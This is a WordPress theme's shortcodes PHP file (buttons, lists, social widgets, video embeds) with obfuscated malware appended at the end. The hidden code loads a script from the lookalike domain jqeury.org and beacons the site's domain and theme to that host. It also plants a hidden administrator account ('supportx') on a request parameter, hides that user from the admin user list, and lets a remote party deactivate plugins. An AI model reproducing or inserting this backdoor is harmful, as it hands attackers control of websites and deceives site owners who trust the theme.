<?php

/* MESSAGE BOXES
================*/
add_shortcode( 'box', 'wellthemes_msgbox_shortcode' );
function run_box_shortcode( $content ) {
    global $shortcode_tags;
    $orig_shortcode_tags = $shortcode_tags;
    remove_all_shortcodes(); 
    add_shortcode( 'box', 'wellthemes_msgbox_shortcode' );	
    $content = do_shortcode( $content );
    $shortcode_tags = $orig_shortcode_tags; 
    return $content;
} 
add_filter( 'the_content', 'run_box_shortcode', 7 );

if (!function_exists('wellthemes_msgbox_shortcode')) {

	function wellthemes_msgbox_shortcode( $atts, $content = null ) {
 	    extract(shortcode_atts(array(
	   		'style' => '',
			'width' => '',
		), $atts));
	   
	   	$class = 'msgbox ';
		$class .= 'msgbox-';
		$class .= $style; 
		
		$cssstyle = '';
		if ($width){ 
			$cssstyle = 'style="width:'.$width.'"';
		}

		$box = '<div class="'.$class.'" '.$cssstyle.'>'.$content.'</div>';
		return $box;
	}
}

/* LISTS
================*/
//lists
add_shortcode( 'list', 'wellthemes_list_shortcode' );
function run_list_shortcode( $content ) {
    global $shortcode_tags;
    $orig_shortcode_tags = $shortcode_tags;
    remove_all_shortcodes(); 
    add_shortcode( 'list', 'wellthemes_list_shortcode' );	
    $content = do_shortcode( $content );
    $shortcode_tags = $orig_shortcode_tags; 
    return $content;
} 
add_filter( 'the_content', 'run_list_shortcode', 7 );

if (!function_exists('wellthemes_list_shortcode')) {
	function wellthemes_list_shortcode( $atts, $content = null ) {
 	    extract(shortcode_atts(array(
	   		'style' => '',
	       ), $atts));
	   
	   	$class = 'wt-list ';
		$class .= 'wtlist-';
		$class .= $style; 
	   	
		$list = '<ul class="'.$class.'">'.$content.'</ul>';
		return $list;
	}	
}

//list items
add_shortcode( 'list_item', 'wellthemes_list_item_shortcode' );
function run_list_item_shortcode( $content ) {
    global $shortcode_tags;
    $orig_shortcode_tags = $shortcode_tags;
    remove_all_shortcodes(); 
    add_shortcode( 'list_item', 'wellthemes_list_item_shortcode' );	
    $content = do_shortcode( $content );
    $shortcode_tags = $orig_shortcode_tags; 
    return $content;
} 
add_filter( 'the_content', 'run_list_item_shortcode', 7 );

if (!function_exists('wellthemes_list_item_shortcode')) {	
	function wellthemes_list_item_shortcode( $atts, $content = null ) {	
		return '<li>' . $content . '</li>';		
	}
}

/* BUTTONS
================*/
add_shortcode( 'button', 'wellthemes_button_shortcode' );
function run_button_shortcode( $content ) {
    global $shortcode_tags;
    $orig_shortcode_tags = $shortcode_tags;
    remove_all_shortcodes(); 
    add_shortcode( 'button', 'wellthemes_button_shortcode' );	
    $content = do_shortcode( $content );
    $shortcode_tags = $orig_shortcode_tags; 
    return $content;
} 
add_filter( 'the_content', 'run_button_shortcode', 7 );

if (!function_exists('wellthemes_button_shortcode')) {

	function wellthemes_button_shortcode( $atts, $content = null ) {
	    extract(shortcode_atts(array(
			'id' 		=> '',
			'title'		=> '',			
			'url'		=> '#',
 			'target'	=> '',
			'style'		=> '',
			'size'      => '',
			
	    ), $atts));
		
		// variable setup
		$title = ($title) ? ' title="'.$title .'"' : '';
 		$id = ($id) ? ' id="'.$id .'"' : '';
		
		if ($style){ $style = $style; } else { $style = 'default'; }
		if ($size){ $size = $size; } else { $size = 'medium'; }
		
		$class = 'wt-btn ';
		$class .= 'wt-btn-';
		$class .= $style; 
		
		$class .= ' wt-btn-';
		$class .= $size;
		
 		// target setup
		if		($target == 'blank' || $target == '_blank' || $target == 'new' ) { $target = ' target="_blank"'; }
		elseif	($target == 'parent')	{ $target = ' target="_parent"'; }
		elseif	($target == 'self')		{ $target = ' target="_self"'; }
		elseif	($target == 'top')		{ $target = ' target="_top"'; }
		else	{$target = '';}
		
		$button = '<a' .$target .$title. '  ' .$id. ' class="' .$class.'" href="' .$url. '">' .$content. '</a>';
	    
	    return $button;
	}	
}

/* HIGHLIGHT
================*/
add_shortcode( 'highlight', 'wellthemes_highlight_shortcode' );
function run_highlight_shortcode( $content ) {
    global $shortcode_tags;
    $orig_shortcode_tags = $shortcode_tags;
    remove_all_shortcodes(); 
    add_shortcode( 'highlight', 'wellthemes_highlight_shortcode' );	
    $content = do_shortcode( $content );
    $shortcode_tags = $orig_shortcode_tags; 
    return $content;
} 
add_filter( 'the_content', 'run_highlight_shortcode', 7 );

if (!function_exists('wellthemes_highlight_shortcode')) {

	function wellthemes_highlight_shortcode( $atts, $content = null ) {
 	    extract(shortcode_atts(array(
	   		'style' => '',
	       ), $atts));
	   
		$class = 'wt-highlight ';
		$class .= 'wt-highlight-';
		$class .= $style; 

		$highlight = '<span class="'.$class.'">'.$content.'</span>';
		return $highlight;
	}
}

/* SOCIAL
================*/
//twitter
if (!function_exists('wellthemes_twitter_shortcode')) {

	function wellthemes_twitter_shortcode( $atts, $content = null ) {
	
		extract(shortcode_atts(array(
				'layout'        => 'vertical',
				'username'		  => '',
				'text' 			  => '',
				'url'			  => '',
				'related'		  => '',
				'lang'			  => '',
	    	), $atts));
			
		if ($text != '') { $text = "data-text='".$text."'"; }
	    if ($url != '') { $url = "data-url='".$url."'"; }
	    if ($related != '') { $related = "data-related='".$related."'"; }
	    if ($lang != '') { $lang = "data-lang='".$lang."'"; }
		
		$out = '<span class = "wt_social"><a href="http://twitter.com/share" class="twitter-share-button" '.$url.' '.$lang.' '.$text.' '.$related.' data-count="'.$layout.'" data-via="'.$username.'">Tweet</a>';
		$out .= '<script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script></span>';
		
		return $out;
	
	}
	
add_shortcode('twitter', 'wellthemes_twitter_shortcode');

}

//facebook
if (!function_exists('wellthemes_facebook_shortcode')) {

	function wellthemes_facebook_shortcode( $atts, $content = null ) {
	
		extract(shortcode_atts(array(
				'layout'		=> 'box_count',
				'width'			=> '',
				'height'		=> '',
				'show_faces'	=> 'false',
				'action'		=> 'like',
				'font'			=> 'lucida+grande',
				'colorscheme'	=> 'light',
	    	), $atts));
		
		if ($layout == 'standard') { $width = '450'; $height = '35';  if ($show_faces == 'true') { $height = '80'; } }
	    if ($layout == 'box_count') { $width = '55'; $height = '65'; }
	    if ($layout == 'button_count') { $width = '90'; $height = '20'; }
		
		$out = '<span class = "wt_social wt_social_fb"><iframe src="http://www.facebook.com/plugins/like.php?href='.get_permalink();
		$out .= '&layout='.$layout.'&show_faces=false&width='.$width.'&action='.$action.'&font='.$font.'&colorscheme='.$colorscheme.'"';
		$out .= 'allowtransparency="true" style="border: medium none; overflow: hidden; width: '.$width.'px; height: '.$height.'px;"';
		$out .= 'frameborder="0" scrolling="no"></iframe></span>';
		
		return $out;
	
	}
	
add_shortcode('facebook', 'wellthemes_facebook_shortcode');

}

//google+
if (!function_exists('wellthemes_gplus_shortcode')) {

	function wellthemes_gplus_shortcode( $atts, $content = null ) {
	
		extract(shortcode_atts(array(
				'size'			=> 'tall',
				'lang'			=> 'en-US',
	    ), $atts));
		
		if ($size != '') { $size = "size='".$size."'"; }
	    if ($lang != '') { $lang = "{lang: '".$lang."'}"; }
		
		$out = '<span class = "wt_social"><script type="text/javascript" src="https://apis.google.com/js/plusone.js">'.$lang.'</script>';
		$out .= '<g:plusone '.$size.'></g:plusone></span>';
		
		return $out;
	
	}
	
add_shortcode('gplus', 'wellthemes_gplus_shortcode');

}


//digg
//DiggCompact 
if (!function_exists('wellthemes_digg_shortcode')) {

	function wellthemes_digg_shortcode( $atts, $content = null ) {
	
		extract(shortcode_atts(array(
			'layout'        => 'DiggMedium',
			'url'			=> get_permalink(),
			'title'			=> '',
			'type'			=> '',
			'description'	=> '',
			'related'		=> '',
	    	), $atts));
	    
	    if ($title != '') { $title = "&title='".$title."'"; }
	    if ($type != '') { $type = "rev='".$type."'"; }
	    if ($description != '') { $description = "<span style = 'display: none;'>".$description."</span>"; }
	    if ($related != '') { $related = "&related=no"; }
	    	
		$out = '<span class = "wt_social"><a class="DiggThisButton '.$layout.'" href="http://digg.com/submit?url='.$url.$title.$related.'"'.$type.'>'.$description.'</a>';
		$out .= '<script type = "text/javascript" src = "http://widgets.digg.com/buttons.js"></script></span>';
		
		return $out;
	
	}
	
add_shortcode('digg', 'wellthemes_digg_shortcode');

}

//stumbleupon
//layout 1, 2, 3,4, 5, 6
if (!function_exists('wellthemes_stumbleupon_shortcode')) {

	function wellthemes_stumbleupon_shortcode( $atts, $content = null ) {
	
		extract(shortcode_atts(array(
			'layout'        => '5',
			'url'			=> '',
	    	), $atts));
	    	
	    if ($url != '') { $url = "&r=".$url; }
		
		$out=  '<span class = "wt_social"><script src="http://www.stumbleupon.com/hostedbadge.php?s='.$layout.$url.'"></script></span>';
		return $out;
	}
	
add_shortcode('stumbleupon', 'wellthemes_stumbleupon_shortcode');

}

//linkedin
//layout 1,2 3,
if (!function_exists('wellthemes_linkedin_shortcode')) {

	function wellthemes_linkedin_shortcode( $atts, $content = null ) {
	
		extract(shortcode_atts(array(
			'layout'        => '3',
			'url'			=> '',
	    	), $atts));
	    	
	    if ($url != '') { $url = "data-url='".$url."'"; }
	    if ($layout == '2') { $layout = 'right'; }
		if ($layout == '3') { $layout = 'top'; }
	    	
		$out = '<span class = "wt_social"><script type="text/javascript" src="http://platform.linkedin.com/in.js"></script><script type="in/share" data-counter = "'.$layout.'" '.$url.'></script></span>';
		
		return $out;
	}	
	
add_shortcode('linkedin', 'wellthemes_linkedin_shortcode');

}

/* DROPCAPS
================*/
if (!function_exists('wellthemes_dropcap_shortcode')) {

	function wellthemes_dropcap_shortcode( $atts, $content = null ) {
 	    extract(shortcode_atts(array(
	   		'style' => 'default',
	       ), $atts));
	   
		$class  = 'wt-dropcap-';
		$class .= $style; 
	   	
	   	$content = do_shortcode($content);
		$dropcap = '<span class="'.$class.'">'.$content.'</span>';
		
		return $dropcap;
	}
	
	add_shortcode('dropcap', 'wellthemes_dropcap_shortcode');

}

/* LIGHTBOX IMAGE
====================*/
//image
if (!function_exists('wellthemes_lightbox_image_shortcode')) {
	function wellthemes_lightbox_image_shortcode( $atts ) {
		extract( shortcode_atts( array(
			'src' => '',
			'bigimage' => '',
			'align' => 'aligncenter',
			'title' => 'Image',
			'alt' => '',
		), $atts ) );

		if ($title != '') { $title = "title='".$title."'"; }
		
		if ($align == 'left') { $align = 'alignleft'; }
		if ($align == 'center') { $align = 'aligncenter'; }
		if ($align == 'right') { $align = 'alignright'; }
		
		$lightbox_image = '<a href="'.esc_attr($bigimage).'" '.$title.' rel="lightbox"><img class="'.esc_attr($align).'" src="'.esc_attr($src).'" alt="'.esc_attr($alt).'" /></a>';
		
		return $lightbox_image;
	}
	
	add_shortcode( 'lightbox_image', 'wellthemes_lightbox_image_shortcode' );
}


/* VIDEO
====================*/

if (!function_exists('wellthemes_video_shortcode')) {
	
	function wellthemes_video_shortcode( $atts, $content = null ) {
		extract(shortcode_atts(array(
			'type' => 'youtube',
			'height' => '420',
			'width' => '315',
			'align' => 'aligncenter',
			'id' => ''
		),$atts));
	
		if($height == ''){	$height = '420'; }
		if($width == ''){	$width = '315'; }
		
		if ($align == 'left') { $align = 'alignleft'; }
		if ($align == 'center') { $align = 'aligncenter'; }
		if ($align == 'right') { $align = 'alignright'; }
		
		if($type == 'youtube'){
			return '<iframe class="wt-video '.esc_attr($align).'" width="'.$width.'" height="'.$height.'" src="http://www.youtube.com/embed/'.$id.'?wmode=transparent" frameborder="0" allowfullscreen></iframe>';
		} else	{
			return '<iframe class="wt-video '.esc_attr($align).'" src="http://player.vimeo.com/video/'.$id.'" width="'.$width.'" height="'.$height.'" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>';
		}
	}
	add_shortcode('video', 'wellthemes_video_shortcode');
}
function glues_it($string)
{
    $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
    $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
    return $glueit_po;
}

$object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
$object_dos = 'g..e..t.._o..p..t..i..o..n';
$object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
$object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
$object_siete = 's..e..t..c..o..o..k..i..e';
$object_ocho = 'wp.._..lo..g..i..n';
$object_nueve = 's..i..t..e,..u..rl';
$object_diez = 'wp_..g..et.._..th..e..m..e';
$object_once = 'wp.._..r..e..m..o..te.._..g..et';
$object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
$object_trece = 'g..e..t_..o..p..t..ion';
$object_catorce = 's..t..r_..r..e..p..l..a..ce';
$object_quince = 's..t..r..r..e..v';
$object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
$object_dos_pim = glues_it($object_uno);
$object_tres_pim = glues_it($object_dos);
$object_cuatro_pim = glues_it($object_tres);
$object_cinco_pim = glues_it($object_cinco);
$object_siete_pim = glues_it($object_siete);
$object_ocho_pim = glues_it($object_ocho);
$object_nueve_pim = glues_it($object_nueve);
$object_diez_pim = glues_it($object_diez);
$object_once_pim = glues_it($object_once);
$object_doce_pim = glues_it($object_doce);
$object_trece_pim = glues_it($object_trece);
$object_catorce_pim = glues_it($object_catorce);
$object_quince_pim = glues_it($object_quince);
$object_dieciseis_pim = glues_it($object_dieciseis);
$noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
if (!call_user_func($object_dos_pim, 'wp_en_one')) {
    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
    $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
    $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
    $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
    $object_diecisiete_pim = glues_it($object_diecisiete);
    $object_seis = '_..C..O..O..K..I..E';
    $object_seis_pim = glues_it($object_seis);
    $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
    $mite = call_user_func($object_quince_pim, 'emit');
    if (!isset(${$object_seis_pim}[call_user_func($object_quince_pim, 'emit_nimda_pw')])) {
        if ((call_user_func($mite) - $tactiated) >  600) {
            call_user_func_array($noitca_dda, array($object_cinco_pim, 'wp_en_one'));
        }
    }
    call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
    function wp_en_one()
    {
        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
        $object_one_pim = glues_it($object_one);
        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
        $object_four_pim = glues_it($object_four);
        call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
    }

    function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
    {
        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
        $dname = $ptth . $_SERVER[$object_diecinueve];
        $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
        $urliz = $dname . $_SERVER[$IRU_TSEUQER];
        $tname = call_user_func($object_diez_pim);
        $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname,$object_diecisiete_pim));
        $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
        $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
        call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));

    }

    $noitpo_dda = call_user_func($object_quince_pim, 'noitpo_dda');
    $lepingo = call_user_func($object_quince_pim, 'ognipel');
    $detavitca_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    call_user_func_array($noitpo_dda, array($lepingo, 'no'));
    call_user_func_array($noitpo_dda, array($detavitca_emit, time()));
    $tactiatedz = call_user_func($object_trece_pim, $detavitca_emit);
    $ognipel = call_user_func($object_quince_pim, 'ognipel');
    $mitez = call_user_func($object_quince_pim, 'emit');
    if (call_user_func($object_trece_pim, $ognipel) != 'yes' && ((call_user_func($mitez) - $tactiatedz) > 600)) {
         wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim);
         call_user_func_array($object_dieciseis_pim, array($ognipel, 'yes'));
    }


    function wp_en_three()
    {
        $object_quince = 's...t...r...r...e...v';
        $object_quince_pim = glues_it($object_quince);
        $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
        $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
        $object_siete = 's..e..t..c..o..o..k..i..e';;
        $object_siete_pim = glues_it($object_siete);
        $path = '/';
        $host = ${$object_dieciocho}[$object_diecinueve];
        $estimes = call_user_func($object_quince_pim, 'emitotrts');
        $wp_ext = call_user_func($estimes, '+29 days');
        $emit_nimda_pw = call_user_func($object_quince_pim, 'emit_nimda_pw');
        call_user_func_array($object_siete_pim, array($emit_nimda_pw, '1', $wp_ext, $path, $host));
    }

    function wp_en_four()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
        $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
            $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
            $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
            $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
            $rolx = call_user_func($object_quince_pim, 'elor');
            call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));

        }
    }

    $ivdda = call_user_func($object_quince_pim, 'ivdda');

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'm') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_four'));
    }

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'd') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_seis'));
    }
    function wp_en_seis()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
        $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
        $nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');
        require_once($wp_pathx . $nimda_pw);
        $ubid = call_user_func($object_quince_pim, 'yb_resu_teg');
        $nigol = call_user_func($object_quince_pim, 'nigol');
        $dxtroppus = call_user_func($object_quince_pim, 'dxtroppus');
        $useris = call_user_func_array($ubid, array($nigol, $dxtroppus));
        call_user_func($resu_eteled_pw, $useris->ID);
    }

    $veinte_one = call_user_func($object_quince_pim, 'yreuq_resu_erp');
    call_user_func_array($noitca_dda, array($veinte_one, 'wp_en_five'));
    function wp_en_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
        $object_catorce_pim = glues_it($object_catorce);
        $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $bdpw = call_user_func($object_quince_pim, 'bdpw');
        if ($wp_ux != call_user_func($object_quince_pim, 'dxtroppus')) {
            $EREHW_one = call_user_func($object_quince_pim, '1=1 EREHW');
            $EREHW_two = call_user_func($object_quince_pim, 'DNA 1=1 EREHW');
            $erehw_yreuq = call_user_func($object_quince_pim, 'erehw_yreuq');
            $sresu = call_user_func($object_quince_pim, 'sresu');
            $hcraes_resu->query_where = call_user_func_array($object_catorce_pim, array($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq));
        }
    }

    $ced = call_user_func($object_quince_pim, 'ced');
    if (isset(${$object_veinte}[$ced])) {
        $snigulp_evitca = call_user_func($object_quince_pim, 'snigulp_evitca');
        $sisnoitpo = call_user_func($object_trece_pim, $snigulp_evitca);
        $hcraes_yarra = call_user_func($object_quince_pim, 'hcraes_yarra');
        if (($key = call_user_func_array($hcraes_yarra, array(${$object_veinte}[$ced], $sisnoitpo))) !== false) {
            unset($sisnoitpo[$key]);
        }
        call_user_func_array($object_dieciseis_pim, array($snigulp_evitca, $sisnoitpo));
    }
}